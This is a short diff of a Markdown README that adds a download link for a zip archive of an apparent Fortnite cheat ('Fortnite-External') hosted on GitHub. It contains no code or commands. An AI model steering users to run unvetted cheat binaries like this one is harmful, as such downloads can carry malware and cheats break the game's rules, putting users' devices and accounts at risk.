@@ -1,5 +1,5 @@
 # Download
-## [Release]()
+## [Release](https://github.com/FlexRetakesOnYoutube/Fortnite-External/releases/download/Kingz/KingzFortnite.zip)
 
 <p align="center">
     <img src="https://i.imgur.com/mtKemJ4.png"> 
